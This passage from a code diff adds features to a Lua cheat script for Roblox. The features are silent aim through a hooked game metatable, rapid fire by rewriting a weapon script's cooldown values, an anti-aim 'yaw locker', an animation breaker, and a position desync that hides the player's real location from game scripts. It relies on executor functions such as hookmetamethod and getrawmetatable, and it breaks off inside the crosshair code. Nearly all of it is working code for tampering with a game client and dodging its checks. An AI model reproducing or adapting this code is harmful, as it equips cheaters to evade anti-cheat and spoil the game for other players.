+            if not humanoid then return end
+            local rootPart = character.HumanoidRootPart
+            local moveDir = humanoid.MoveDirection
+            if moveDir.Magnitude > 0 then
+                local speedMult = (humanoid:GetState() == Enum.HumanoidStateType.Freefall or humanoid:GetState() == Enum.HumanoidStateType.Jumping)
+                    and AntiInertiaSettings.Speed.Air or AntiInertiaSettings.Speed.Ground
+                local newVel = moveDir * speedMult * 50
+                if AntiInertiaSettings.NoInertia then
+                    rootPart.Velocity = Vector3.new(newVel.X, rootPart.Velocity.Y, newVel.Z)
+                else
+                    local curVel = rootPart.Velocity
+                    rootPart.Velocity = Vector3.new(
+                        curVel.X + (newVel.X - curVel.X) * 0.5,
+                        rootPart.Velocity.Y,
+                        curVel.Z + (newVel.Z - curVel.Z) * 0.5
+                    )
+                end
+            elseif AntiInertiaSettings.NoInertia then
+                rootPart.Velocity = Vector3.new(0, rootPart.Velocity.Y, 0)
+            end
+        end)
+    end
+end
+
+LP.CharacterAdded:Connect(function()
+    if AntiInertiaSettings.Enabled then
+        ToggleAntiInertia(true)
+    end
+end)
+
+AntiInertiaGroup:AddToggle('Anti Inertia', {
+    Text = 'Anti Inertia',
+    Default = false,
+    Callback = function(v)
+        ToggleAntiInertia(v)
+    end,
+    Tooltip = 'Removes inertia from movement (instant stop/start)'
+})
+
+-- === Yaw Locker (Player tab, новая секция) ===
+local YawLockerGroup = Tabs.Player:AddLeftGroupbox('>_<')
+
+local YawLockerConfig = {
+    Enabled = false,
+    Angle = 0,
+    Mode = 'Locked',
+    Modes = {'Locked', 'Jitter', '3 Ways', '5 Ways'},
+    AtTarget = false,
+    DisableAutoRotate = false
+}
+
+local yawLockerConnection = nil
+local yawJitterState = 1
+local yawJitterTimer = 0
+
+local function getYawAngles()
+    local a = YawLockerConfig.Angle
+    if YawLockerConfig.Mode == 'Locked' then
+        return {a}
+    elseif YawLockerConfig.Mode == 'Jitter' then
+        return {a, -a}
+    elseif YawLockerConfig.Mode == '3 Ways' then
+        return {-a, 0, a}
+    elseif YawLockerConfig.Mode == '5 Ways' then
+        return {-a, -a/2, 0, a/2, a}
+    end
+    return {a}
+end
+
+local function applyYawLockerAutoRotate()
+    local char = LP.Character
+    if char then
+        local hum = char:FindFirstChildOfClass('Humanoid')
+        if hum then
+            hum.AutoRotate = not YawLockerConfig.DisableAutoRotate
+        end
+    end
+end
+
+local function setYawLocker(state)
+    YawLockerConfig.Enabled = state
+    if yawLockerConnection then
+        yawLockerConnection:Disconnect()
+        yawLockerConnection = nil
+    end
+    yawJitterState = 1
+    yawJitterTimer = 0
+    applyYawLockerAutoRotate()
+    if state then
+        yawLockerConnection = RND:Connect(function(dt)
+            local char = LP.Character
+            if not char then return end
+            local hrp = char:FindFirstChild('HumanoidRootPart')
+            if not hrp then return end
+            
+            local myPos = hrp.Position
+            local lookVector
+            
+            if YawLockerConfig.AtTarget then
+                local target = getgenv().SilentAim and getgenv().SilentAim.currentTarget
+                if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
+                    local targetHrp = target.Character.HumanoidRootPart
+                    local directionToTarget = (targetHrp.Position - myPos)
+                    local baseYaw = math.atan2(directionToTarget.X, directionToTarget.Z)
+                    
+                    local angles = getYawAngles()
+                    local finalYaw
+                    
+                    if YawLockerConfig.Mode == 'Jitter' then
+                        yawJitterTimer = yawJitterTimer + dt
+                        if yawJitterTimer > 0.1 then
+                            yawJitterState = 3 - yawJitterState -- 1 <-> 2
+                            yawJitterTimer = 0
+                        end
+                        finalYaw = baseYaw + math.rad(angles[yawJitterState])
+                    elseif YawLockerConfig.Mode == '3 Ways' then
+                         yawJitterTimer = yawJitterTimer + dt
+                        if yawJitterTimer > 0.15 then
+                            yawJitterState = yawJitterState % 3 + 1
+                            yawJitterTimer = 0
+                        end
+                        finalYaw = baseYaw + math.rad(angles[yawJitterState])
+                    elseif YawLockerConfig.Mode == '5 Ways' then
+                         yawJitterTimer = yawJitterTimer + dt
+                        if yawJitterTimer > 0.12 then
+                            yawJitterState = yawJitterState % 5 + 1
+                             yawJitterTimer = 0
+                        end
+                        finalYaw = baseYaw + math.rad(angles[yawJitterState])
+                    else -- Locked
+                        finalYaw = baseYaw + math.rad(angles[1])
+                    end
+                    
+                    lookVector = Vector3.new(math.sin(finalYaw), 0, math.cos(finalYaw))
+                end
+            else -- Режим не AtTarget
+                local angles = getYawAngles()
+                local yaw
+                if YawLockerConfig.Mode == 'Locked' then
+                    yaw = math.rad(angles[1])
+                elseif YawLockerConfig.Mode == 'Jitter' then
+                    yawJitterTimer = yawJitterTimer + dt
+                    if yawJitterTimer > 0.1 then
+                        yawJitterState = 3 - yawJitterState -- 1 <-> 2
+                        yawJitterTimer = 0
+                    end
+                    yaw = math.rad(angles[yawJitterState])
+                elseif YawLockerConfig.Mode == '3 Ways' then
+                    yawJitterTimer = yawJitterTimer + dt
+                    if yawJitterTimer > 0.15 then
+                        yawJitterState = yawJitterState % 3 + 1
+                        yawJitterTimer = 0
+                    end
+                    yaw = math.rad(angles[yawJitterState])
+                elseif YawLockerConfig.Mode == '5 Ways' then
+                    yawJitterTimer = yawJitterTimer + dt
+                    if yawJitterTimer > 0.12 then
+                        yawJitterState = yawJitterState % 5 + 1
+                        yawJitterTimer = 0
+                    end
+                    yaw = math.rad(angles[yawJitterState])
+                else
+                    yaw = math.rad(YawLockerConfig.Angle)
+                end
+                lookVector = Vector3.new(math.sin(yaw), 0, math.cos(yaw))
+            end
+
+            if lookVector then
+                hrp.CFrame = CFrame.new(myPos, myPos + lookVector)
+            end
+        end)
+    end
+end
+
+YawLockerGroup:AddToggle('YawLocker', {
+    Text = 'Yaw Locker',
+    Default = false,
+    Callback = function(v)
+        setYawLocker(v)
+    end,
+    Tooltip = 'Locks your yaw (horizontal rotation) to the selected angle.'
+})
+
+YawLockerGroup:AddDropdown('YawLockerMode', {
+    Text = 'Yaw Mode',
+    Values = YawLockerConfig.Modes,
+    Default = 'Locked',
+    Callback = function(val)
+        YawLockerConfig.Mode = val
+        yawJitterState = 1
+        yawJitterTimer = 0
+    end,
+    Tooltip = 'Yaw lock mode: Locked, Jitter, 3 Ways, 5 Ways'
+})
+
+YawLockerGroup:AddSlider('YawLockerAngle', {
+    Text = 'Yaw Angle',
+    Default = 0,
+    Min = 0,
+    Max = 360,
+    Rounding = 0,
+    Callback = function(val)
+        YawLockerConfig.Angle = val
+    end,
+    Tooltip = 'Set the yaw angle (0-360 degrees)'
+})
+
+YawLockerGroup:AddToggle('YawLockerAtTarget', {
+    Text = 'At Target',
+    Default = false,
+    Callback = function(v)
+        YawLockerConfig.AtTarget = v
+    end,
+    Tooltip = 'Apply yaw relative to aimbot target (face away if 180, etc.)'
+})
+
+YawLockerGroup:AddToggle('YawLockerDisableAutoRotate', {
+    Text = 'Disable AutoRotate',
+    Default = false,
+    Callback = function(v)
+        YawLockerConfig.DisableAutoRotate = v
+        applyYawLockerAutoRotate()
+    end,
+    Tooltip = 'Disables Humanoid.AutoRotate (prevents Roblox from rotating you automatically)'
+})
+LP.CharacterAdded:Connect(function(char)
+    if YawLockerConfig.Enabled or YawLockerConfig.DisableAutoRotate then
+        applyYawLockerAutoRotate()
+    end
+end)
+
+-- === AnimBreaker (Player tab, новая секция) ===
+local AnimBreakerGroup = Tabs.Player:AddRightGroupbox('AnimBreaker')
+
+local AnimBreakerSettings = {
+    enabled = false,
+    delayTime = 0.4,
+    stepSize = 0.4
+}
+
+local animBreakerTracks = {}
+local animBreakerAnimatorConn = nil
+local animBreakerHeartbeatConn = nil
+local animBreakerCoroutine = nil
+
+local function freezeAnimBreakerTrack(track)
+    if not track or not track.IsPlaying then return end
+    track:AdjustSpeed(0)
+    animBreakerTracks[track] = true
+end
+
+local function setupAnimBreakerCharacter(character)
+    local humanoid = character:WaitForChild("Humanoid")
+    local animator = humanoid:WaitForChild("Animator")
+    table.clear(animBreakerTracks)
+    for _, track in pairs(animator:GetPlayingAnimationTracks()) do
+        freezeAnimBreakerTrack(track)
+    end
+    if animBreakerAnimatorConn then animBreakerAnimatorConn:Disconnect() end
+    animBreakerAnimatorConn = animator.AnimationPlayed:Connect(freezeAnimBreakerTrack)
+end
+
+local function toggleAnimBreaker(state)
+    AnimBreakerSettings.enabled = state
+    if animBreakerHeartbeatConn then animBreakerHeartbeatConn:Disconnect() animBreakerHeartbeatConn = nil end
+    if animBreakerCoroutine then coroutine.close(animBreakerCoroutine) animBreakerCoroutine = nil end
+    if state then
+        animBreakerHeartbeatConn = HRT:Connect(function()
+            for track in pairs(animBreakerTracks) do
+                if track and track.IsPlaying then
+                    track:AdjustSpeed(0)
+                else
+                    animBreakerTracks[track] = nil
+                end
+            end
+        end)
+        animBreakerCoroutine = coroutine.create(function()
+            while AnimBreakerSettings.enabled do
+                for track in pairs(animBreakerTracks) do
+                    if track and track.IsPlaying then
+                        track.TimePosition = track.TimePosition + AnimBreakerSettings.stepSize
+                    end
+                end
+                task.wait(AnimBreakerSettings.delayTime)
+            end
+        end)
+        coroutine.resume(animBreakerCoroutine)
+    end
+end
+
+LP.CharacterAdded:Connect(function(character)
+    if AnimBreakerSettings.enabled then
+        setupAnimBreakerCharacter(character)
+    end
+end)
+if LP.Character then setupAnimBreakerCharacter(LP.Character) end
+
+AnimBreakerGroup:AddToggle('AnimBreaker', {
+    Text = 'Anim Breaker',
+    Default = false,
+    Callback = function(v)
+        toggleAnimBreaker(v)
+        if v and LP.Character then
+            setupAnimBreakerCharacter(LP.Character)
+        end
+    end,
+    Tooltip = 'Breaks your animations (freezes and jitters)'
+})
+
+-- === RapidFireGunScript (Player tab, новая секция) ===
+local RapidFireGunScriptGroup = Tabs.Player:AddRightGroupbox('>_<')
+
+local Traced = { RapidFire = false }
+local Orginal = {}
+local rapidFireGunScriptConn = nil
+
+local function enableRapidFireGunScript()
+    if rapidFireGunScriptConn then rapidFireGunScriptConn:Disconnect() end
+    rapidFireGunScriptConn = RND:Connect(function()
+        local tool = LP.Character and LP.Character:FindFirstChildOfClass('Tool')
+        if tool and tool:FindFirstChild('GunScript') then
+            for _, connection in ipairs(getconnections(tool.Activated)) do
+                local func = connection.Function
+                if func then
+                    local funcInfo = debug.getinfo(func)
+                    for i = 1, funcInfo.nups do
+                        local c, n = debug.getupvalue(func, i)
+                        if type(c) == 'number' then
+                            if not Orginal[i] then
+                                Orginal[i] = c
+                            end
+                            debug.setupvalue(func, i, Traced.RapidFire and 0.00000000000000000001 or Orginal[i])
+                        end
+                    end
+                end
+            end
+        end
+    end)
+    Traced.RapidFire = true
+end
+
+local function disableRapidFireGunScript()
+    if rapidFireGunScriptConn then rapidFireGunScriptConn:Disconnect() rapidFireGunScriptConn = nil end
+    Traced.RapidFire = false
+end
+
+RapidFireGunScriptGroup:AddToggle('RapidFireGunScript', {
+    Text = 'Rapid Fire GunScript Method',
+    Default = false,
+    Callback = function(v)
+        if v then
+            enableRapidFireGunScript()
+        else
+            disableRapidFireGunScript()
+        end
+    end,
+    Tooltip = 'Patch GunScript for instant fire.'
+})
+
+-- === RapidFireM1Spam (Player tab, новая секция) ===
+local RapidFireM1Group = Tabs.Player:AddRightGroupbox('>_<')
+
+local rapidFireM1Firing = false
+local rapidFireM1Debounce = false
+local rapidFireM1MinDelay = 0 -- Можно сделать настройку через UI
+local rapidFireM1ConnBegan, rapidFireM1ConnEnded, rapidFireM1CharConn
+
+local function rapidFireM1SafeActivate(tool)
+    if not rapidFireM1Debounce and tool and tool:IsA('Tool') then
+        rapidFireM1Debounce = true
+        pcall(function() tool:Activate() end)
+        task.wait(rapidFireM1MinDelay)
+        rapidFireM1Debounce = false
+    end
+end
+
+local function rapidFireM1FireLoop()
+    while rapidFireM1Firing do
+        local character = LP.Character
+        if character then
+            local tool = character:FindFirstChildOfClass('Tool')
+            rapidFireM1SafeActivate(tool)
+        end
+        HRT:Wait()
+    end
+end
+
+local function rapidFireM1SetupCharacter(character)
+    if rapidFireM1CharConn then rapidFireM1CharConn:Disconnect() end
+    rapidFireM1CharConn = character.ChildAdded:Connect(function(child)
+        if child:IsA('Tool') then
+            child.Activated:Connect(function()
+                if rapidFireM1Firing then
+                    rapidFireM1SafeActivate(child)
+                end
+            end)
+        end
+    end)
+end
+
+local function enableRapidFireM1()
+    if rapidFireM1ConnBegan then rapidFireM1ConnBegan:Disconnect() end
+    if rapidFireM1ConnEnded then rapidFireM1ConnEnded:Disconnect() end
+    rapidFireM1ConnBegan = S.UIS.InputBegan:Connect(function(input, gp)
+        if not gp and input.UserInputType == Enum.UserInputType.MouseButton1 then
+            rapidFireM1Firing = true
+            rapidFireM1FireLoop()
+        end
+    end)
+    rapidFireM1ConnEnded = S.UIS.InputEnded:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 then
+            rapidFireM1Firing = false
+        end
+    end)
+    if LP.Character then rapidFireM1SetupCharacter(LP.Character) end
+    LP.CharacterAdded:Connect(function(character)
+        character:WaitForChild('Humanoid')
+        rapidFireM1SetupCharacter(character)
+    end)
+end
+
+local function disableRapidFireM1()
+    if rapidFireM1ConnBegan then rapidFireM1ConnBegan:Disconnect() rapidFireM1ConnBegan = nil end
+    if rapidFireM1ConnEnded then rapidFireM1ConnEnded:Disconnect() rapidFireM1ConnEnded = nil end
+    if rapidFireM1CharConn then rapidFireM1CharConn:Disconnect() rapidFireM1CharConn = nil end
+    rapidFireM1Firing = false
+end
+
+RapidFireM1Group:AddToggle('RapidFireM1Spam', {
+    Text = 'Rapid Fire M1 Spam',
+    Default = false,
+    Callback = function(v)
+        if v then
+            enableRapidFireM1()
+        else
+            disableRapidFireM1()
+        end
+    end,
+    Tooltip = 'Auto spam Mouse1 (tool activation)'
+})
+
+-- === Destroy Cheaters (Misc tab, новая левая секция) ===
+local DestroyCheatersGroup = Tabs.Misc:AddLeftGroupbox('>_<')
+
+local destroyCheatersEnabled = false -- разрешение работы функции (toggle)
+local destroyCheatersActive = false  -- текущее состояние (keybind)
+local destroyCheatersKey = Enum.KeyCode.X
+local destroyCheatersLastCFrame = nil
+local destroyCheatersHook = nil
+local destroyCheatersConn = nil
+
+local function setDestroyCheatersActive(state)
+    destroyCheatersActive = state
+    getgenv().Finobe1 = state
+    if not state and LP.Character and LP.Character:FindFirstChild('HumanoidRootPart') and destroyCheatersLastCFrame then
+        LP.Character.HumanoidRootPart.CFrame = destroyCheatersLastCFrame
+        Library:Notify('Destroy Cheaters: Disabled', 3)
+    elseif state then
+        destroyCheatersLastCFrame = nil
+        Library:Notify('Destroy Cheaters: Enabled', 3)
+    end
+end
+
+if destroyCheatersConn then destroyCheatersConn:Disconnect() end
+
+destroyCheatersConn = HRT:Connect(function()
+    if not destroyCheatersEnabled or not destroyCheatersActive then return end
+    if LP.Character and LP.Character:FindFirstChild('HumanoidRootPart') then
+        local hrp = LP.Character.HumanoidRootPart
+        local offset = hrp.CFrame * CFrame.new(9e9, 0/0, math.huge)
+        destroyCheatersLastCFrame = hrp.CFrame
+        hrp.CFrame = offset
+        RND:Wait()
+        hrp.CFrame = destroyCheatersLastCFrame
+    end
+end)
+
+if destroyCheatersHook == nil then
+    destroyCheatersHook = hookmetamethod(game, "__index", newcclosure(function(self, key)
+        if not checkcaller() then
+            if key == "CFrame" and getgenv().Finobe1 and LP.Character and LP.Character:FindFirstChild("HumanoidRootPart") and LP.Character:FindFirstChild("Humanoid") and LP.Character:FindFirstChild("Humanoid").Health > 0 then
+                if self == LP.Character.HumanoidRootPart and destroyCheatersLastCFrame ~= nil then
+                    return destroyCheatersLastCFrame
+                end
+            end
+        end
+        return destroyCheatersHook(self, key)
+    end))
+end
+
+local destroyCheatersKeyConn
+if destroyCheatersKeyConn then destroyCheatersKeyConn:Disconnect() end
+
+destroyCheatersKeyConn = S.UIS.InputBegan:Connect(function(input, gp)
+    if not gp and input.KeyCode == destroyCheatersKey and destroyCheatersEnabled then
+        setDestroyCheatersActive(not destroyCheatersActive)
+    end
+end)
+
+DestroyCheatersGroup:AddToggle('DestroyCheaters', {
+    Text = 'Destroy Cheaters',
+    Default = false,
+    Callback = function(v)
+        destroyCheatersEnabled = v
+        if not v and destroyCheatersActive then
+            setDestroyCheatersActive(false)
+        end
+    end,
+    Tooltip = 'Enable keybind to toggle anti-exploit position breaker.'
+}):AddKeyPicker('DestroyCheatersKey', {
+    Default = 'X',
+    Text = 'Destroy Cheaters Key',
+    NoUI = false,
+    Callback = function(key)
+        destroyCheatersKey = Enum.KeyCode[key] or Enum.KeyCode.X
+    end
+})
+
+DestroyCheatersGroup:AddButton({
+    Text = 'Destroy Void',
+    Func = function()
+        workspace.FallenPartsDestroyHeight = 0/0
+        Library:Notify('Void destroyed!', 3)
+    end,
+    Tooltip = 'Set FallenPartsDestroyHeight to NaN'
+})
+
+-- === Silent Aim (Combat tab, новая секция) ===
+local SilentAimGroup = Tabs.Combat:AddLeftGroupbox('>_<')
+
+getgenv().SilentAim = {
+    Options = {
+        Enabled = false,
+        Mode = "Nuker",
+        StickyKey = Enum.KeyCode.Q,
+    },
+    Silent = {
+        PredictionXZ = 0.12362,
+        PredictionY = 0.12362,
+        Part = "HumanoidRootPart",
+        Offsets = {
+            Jump = { Amount = 0 },
+            Fall = { Amount = 0 },
+        },
+    },
+    Misc = {
+        Checks = {
+            WallCheck = false,
+            TargetDeathCheck = false,
+            KOCheck = false,
+            GrabbedCheck = false,
+            Resolver = {
+                Enabled = false,
+                Type = "Calculate CFrame",
+            },
+        },
+    },
+    currentTarget = nil
+}
+
+-- UI для Silent Aim
+SilentAimGroup:AddToggle('SilentAimEnabled', {
+    Text = 'Silent Aim',
+    Default = false,
+    Callback = function(v) getgenv().SilentAim.Options.Enabled = v end
+})
+SilentAimGroup:AddDropdown('SilentAimMode', {
+    Text = 'Mode',
+    Values = {'Sticky', 'Nuker'},
+    Default = 'Nuker',
+    Callback = function(v) getgenv().SilentAim.Options.Mode = v end
+})
+SilentAimGroup:AddInput('SilentAimPredictionXZ', {
+    Text = 'Prediction XZ',
+    Default = tostring(getgenv().SilentAim.Silent.PredictionXZ),
+    Numeric = true,
+    Finished = true,
+    Callback = function(val) local n = tonumber(val); if n then getgenv().SilentAim.Silent.PredictionXZ = n end end
+})
+SilentAimGroup:AddInput('SilentAimPredictionY', {
+    Text = 'Prediction Y',
+    Default = tostring(getgenv().SilentAim.Silent.PredictionY),
+    Numeric = true,
+    Finished = true,
+    Callback = function(val) local n = tonumber(val); if n then getgenv().SilentAim.Silent.PredictionY = n end end
+})
+SilentAimGroup:AddInput('SilentAimJumpOffset', {
+    Text = 'Jump Offset',
+    Default = tostring(getgenv().SilentAim.Silent.Offsets.Jump.Amount),
+    Numeric = true,
+    Finished = true,
+    Callback = function(val) local n = tonumber(val); if n then getgenv().SilentAim.Silent.Offsets.Jump.Amount = n end end
+})
+SilentAimGroup:AddInput('SilentAimFallOffset', {
+    Text = 'Fall Offset',
+    Default = tostring(getgenv().SilentAim.Silent.Offsets.Fall.Amount),
+    Numeric = true,
+    Finished = true,
+    Callback = function(val) local n = tonumber(val); if n then getgenv().SilentAim.Silent.Offsets.Fall.Amount = n end end
+})
+SilentAimGroup:AddLabel('Sticky Key'):AddKeyPicker('SilentAimStickyKey', {
+    Default = 'Q',
+    Text = 'Sticky Key',
+    NoUI = false,
+    Callback = function(key)
+        if typeof(key) == "EnumItem" then
+            getgenv().SilentAim.Options.StickyKey = key
+        elseif type(key) == "string" then
+            getgenv().SilentAim.Options.StickyKey = Enum.KeyCode[key] or Enum.KeyCode.Q
+        else
+            -- Игнорируем boolean и прочее
+        end
+    end
+})
+
+-- ... существующий UI для Silent Aim ...
+SilentAimGroup:AddToggle('SilentAimWallCheck', {
+    Text = 'Wall Check',
+    Default = false,
+    Callback = function(v) getgenv().SilentAim.Misc.Checks.WallCheck = v end
+})
+SilentAimGroup:AddToggle('SilentAimKOCheck', {
+    Text = 'KO Check',
+    Default = false,
+    Callback = function(v) getgenv().SilentAim.Misc.Checks.KOCheck = v end
+})
+SilentAimGroup:AddToggle('SilentAimGrabbedCheck', {
+    Text = 'Grabbed Check',
+    Default = false,
+    Callback = function(v) getgenv().SilentAim.Misc.Checks.GrabbedCheck = v end
+})
+SilentAimGroup:AddToggle('SilentAimTargetDeathCheck', {
+    Text = 'Target Death Check',
+    Default = false,
+    Callback = function(v) getgenv().SilentAim.Misc.Checks.TargetDeathCheck = v end
+})
+SilentAimGroup:AddToggle('SilentAimResolverEnabled', {
+    Text = 'Resolver',
+    Default = false,
+    Callback = function(v) getgenv().SilentAim.Misc.Checks.Resolver.Enabled = v end
+})
+
+SilentAimGroup:AddDropdown('SilentAimResolverType', {
+    Text = 'Resolver Type',
+    Values = {'Calculate CFrame', 'Velocity', 'Move direction'},
+    Default = getgenv().SilentAim.Misc.Checks.Resolver.Type,
+    Callback = function(v) getgenv().SilentAim.Misc.Checks.Resolver.Type = v end
+})
+
+SilentAimGroup:AddDropdown('SilentAimPart', {
+    Text = 'Aim Part',
+    Values = {'HumanoidRootPart', 'UpperTorso', 'LowerTorso', 'Head'},
+    Default = getgenv().SilentAim.Silent.Part,
+    Callback = function(v) getgenv().SilentAim.Silent.Part = v end
+})
+
+-- === Silent Aim Logic ===
+if not getgenv().Loaded_SilentAim then
+    getgenv().Loaded_SilentAim = true
+    local SilentAim = getgenv().SilentAim
+    local Players = game:GetService("Players")
+    local Workspace = game:GetService("Workspace")
+    local UserInputService = game:GetService("UserInputService")
+    local LocalPlayer = Players.LocalPlayer
+    local Camera = Workspace.CurrentCamera
+    local Inf = math.huge
+    local NewVector2 = Vector2.new
+    local NewCFrame = CFrame.new
+    local stickyTarget = nil
+    local lastPositions, lastUpdateTimes = {}, {}
+
+    local function isPlayerAlive(player)
+        return player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health > 0
+    end
+    local function isPlayerGrabbed(player)
+        if not player or not player.Character then return false end
+        return player.Character:FindFirstChild("GRABBING_CONSTRAINT") ~= nil
+    end
+    local function isPlayerKO(player)
+        if not player or not player.Character then return false end
+        local bodyEffects = player.Character:FindFirstChild("BodyEffects")
+        if bodyEffects then
+            local KO = bodyEffects:FindFirstChild("K.O")
+            if KO and KO:IsA("BoolValue") and KO.Value then
+                return true
+            end
+        end
+        local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")
+        if humanoidRootPart and humanoidRootPart.Anchored then
+            return true
+        end
+        return false
+    end
+    local function wallCheck(character)
+        if not SilentAim.Misc.Checks.WallCheck then return true end
+        local targetPos = character.HumanoidRootPart.Position
+        local cameraPos = Camera.CFrame.Position
+        local distance = (targetPos - cameraPos).Magnitude
+        local hitPart = Workspace:FindPartOnRayWithIgnoreList(
+            Ray.new(cameraPos, (targetPos - cameraPos).Unit * distance),
+            { LocalPlayer.Character, character }
+        )
+        return hitPart == nil
+    end
+    local function getClosestPlayer()
+        local mousePos = UserInputService:GetMouseLocation()
+        local shortestDistance = Inf
+        local closestPlayer = nil
+        local partName = SilentAim.Silent.Part
+        for _, player in ipairs(Players:GetPlayers()) do
+            if player ~= LocalPlayer and isPlayerAlive(player) and
+               (not SilentAim.Misc.Checks.KOCheck or not isPlayerKO(player)) and
+               (not SilentAim.Misc.Checks.GrabbedCheck or not isPlayerGrabbed(player)) and
+               wallCheck(player.Character) then
+                local character = player.Character
+                local part = character:FindFirstChild(partName)
+                if part then
+                    local screenPos, onScreen = Camera:WorldToViewportPoint(part.Position)
+                    local distance = (NewVector2(screenPos.X, screenPos.Y) - mousePos).Magnitude
+                    if distance < shortestDistance and onScreen then
+                        closestPlayer = player
+                        shortestDistance = distance
+                    end
+                end
+            end
+        end
+        return closestPlayer
+    end
+    local function predictPosition(player)
+        if not player.Character or not player.Character:FindFirstChild(SilentAim.Silent.Part) then return nil end
+        local aimPart = player.Character[SilentAim.Silent.Part]
+        local aimPartPos = aimPart.Position
+        local playerId = player.UserId
+        if not lastPositions[playerId] or not lastUpdateTimes[playerId] then
+            lastPositions[playerId] = aimPartPos
+            lastUpdateTimes[playerId] = tick()
+            return aimPartPos
+        end
+        local currentTime = tick()
+        local deltaTime = currentTime - lastUpdateTimes[playerId]
+        local predictedPos
+        local resolverType = SilentAim.Misc.Checks.Resolver.Type
+        if resolverType == "Velocity" then
+            local velocity = aimPart.Velocity
+            predictedPos = aimPartPos + Vector3.new(
+                velocity.X * SilentAim.Silent.PredictionXZ,
+                velocity.Y * SilentAim.Silent.PredictionY,
+                velocity.Z * SilentAim.Silent.PredictionXZ
+            )
+        elseif resolverType == "Move direction" then
+            predictedPos = aimPartPos + (player.Character.Humanoid.MoveDirection * (SilentAim.Silent.PredictionXZ * 10))
+        elseif resolverType == "Calculate CFrame" then
+            local distance = (aimPartPos - lastPositions[playerId]).Magnitude
+            if distance < 0.001 then
+                predictedPos = aimPartPos
+            else
+                local predictedDistance = (distance / deltaTime) * (0.1 * (SilentAim.Silent.PredictionXZ * 10))
+                predictedPos = aimPartPos + (aimPartPos - lastPositions[playerId]).Unit * predictedDistance
+                local yChange = (aimPartPos.Y - lastPositions[playerId].Y) / deltaTime * (0.1 * SilentAim.Silent.PredictionY)
+                predictedPos = predictedPos + Vector3.new(0, yChange, 0)
+            end
+        end
+        lastPositions[playerId] = aimPartPos
+        lastUpdateTimes[playerId] = currentTime
+        return predictedPos
+    end
+
+    RND:Connect(function()
+        if not SilentAim.Options.Enabled then
+            SilentAim.currentTarget = nil
+            return
+        end
+        local currentTarget = nil
+        if SilentAim.Options.Mode == "Sticky" then
+            if stickyTarget and isPlayerAlive(stickyTarget) and (not SilentAim.Misc.Checks.KOCheck or not isPlayerKO(stickyTarget)) and (not SilentAim.Misc.Checks.GrabbedCheck or not isPlayerGrabbed(stickyTarget)) then
+                currentTarget = stickyTarget
+            else
+                stickyTarget = nil 
+            end
+        else 
+            currentTarget = getClosestPlayer()
+        end
+        SilentAim.currentTarget = currentTarget
+    end)
+    
+    UserInputService.InputBegan:Connect(function(input, gameProcessed)
+        if not gameProcessed and input.KeyCode == SilentAim.Options.StickyKey and SilentAim.Options.Mode == "Sticky" then
+            stickyTarget = getClosestPlayer()
+        end
+    end)
+    local mt = getrawmetatable(game)
+    local oldIndex = mt.__index
+    setreadonly(mt, false)
+    mt.__index = function(self, key)
+        if not checkcaller() and self == LocalPlayer:GetMouse() and SilentAim.Options.Enabled then
+            if key == "Hit" or key == "Target" then
+                local targetPlayer = SilentAim.currentTarget
+                if targetPlayer and targetPlayer.Character then
+                    local targetPart = targetPlayer.Character:FindFirstChild(SilentAim.Silent.Part)
+                    if targetPart then
+                        local finalPos = SilentAim.Misc.Checks.Resolver.Enabled and predictPosition(targetPlayer) or
+                            (targetPart.Position + (targetPart.Velocity * SilentAim.Silent.PredictionXZ))
+                        if finalPos then
+                            local humanoid = targetPlayer.Character:FindFirstChildOfClass("Humanoid")
+                            if humanoid then
+                                if humanoid:GetState() == Enum.HumanoidStateType.Jumping then
+                                    finalPos = finalPos + Vector3.new(0, SilentAim.Silent.Offsets.Jump.Amount, 0)
+                                elseif humanoid:GetState() == Enum.HumanoidStateType.Freefall then
+                                    finalPos = finalPos + Vector3.new(0, SilentAim.Silent.Offsets.Fall.Amount, 0)
+                                end
+                            end
+                            return key == "Hit" and NewCFrame(finalPos) or targetPart
+                        end
+                    end
+                end
+            end
+        end
+        return oldIndex(self, key)
+    end
+    setreadonly(mt, true)
+    local function fixTool(character)
+        if character then
+            for _, item in ipairs(character:GetChildren()) do
+                if item:IsA("Tool") then
+                    item.Parent = LocalPlayer:FindFirstChildOfClass("Backpack")
+                    break
+                end
+            end
+        end
+    end
+    fixTool(LocalPlayer.Character)
+    LocalPlayer.CharacterAdded:Connect(fixTool)
+end
+
+-- ... остальной код ...
+-- ... остальной код ...
+
+-- === Crosshair (Visuals tab, right) ===
+local CrosshairGroup = Tabs.Visuals:AddRightGroupbox('>_<')
+
+local CrosshairConfig = {
+    Enabled = false,
+    Color = Color3.fromRGB(255, 255, 255),
+    Length = 100,
+    Spacing = 5,
+    Thickness = 2,
+    Rotate = true,
+    RotSpeed = 350,
+    Outline = false,
+    OutlineColor = Color3.fromRGB(0, 0, 0),
+    OutlineThickness = 4,
+    AttachToTarget = false,
+    AttachPart = 'UpperTorso',
+    StaticAngle = 0,
+}
+
+local crosshairLines, crosshairOutlines = {}, {}
+local crosshairAngle = 0
+local crosshairConn = nil
+
+local function destroyCrosshair()
+    for _, line in ipairs(crosshairLines) do pcall(function() line:Remove() end) end
+    for _, line in ipairs(crosshairOutlines) do pcall(function() line:Remove() end) end
+    crosshairLines, crosshairOutlines = {}, {}
+    if crosshairConn then crosshairConn:Disconnect() crosshairConn = nil end
+end
+
+local function createCrosshair()
+    destroyCrosshair()
+    for i = 1, 4 do
+        crosshairLines[i] = Drawing.new("Line")
+        if CrosshairConfig.Outline then
+            crosshairOutlines[i] = Drawing.new("Line")
+        end
+    end
+    crosshairConn = S.RS.RenderStepped:Connect(function(dt)
+        if not CrosshairConfig.Enabled then
+            for _, l in ipairs(crosshairLines) do l.Visible = false end
+            for _, l in ipairs(crosshairOutlines) do l.Visible = false end
+            return
+        end
+        local mousePos
+        if CrosshairConfig.AttachToTarget and getgenv().SilentAim and getgenv().SilentAim.currentTarget then
+            local target = getgenv().SilentAim.currentTarget
+            if target and target.Character then
+                local part = target.Character:FindFirstChild(CrosshairConfig.AttachPart) or target.Character:FindFirstChild('HumanoidRootPart')
+                if part then
+                    local screenPos, onScreen = S.WS.CurrentCamera:WorldToViewportPoint(part.Position)
+                    if onScreen then
+                        mousePos = V2.new(screenPos.X, screenPos.Y)
+                    end
+                end
+            end
+        end
+        if not mousePos then
+            mousePos = S.UIS:GetMouseLocation()
+        end
+        if CrosshairConfig.Rotate then
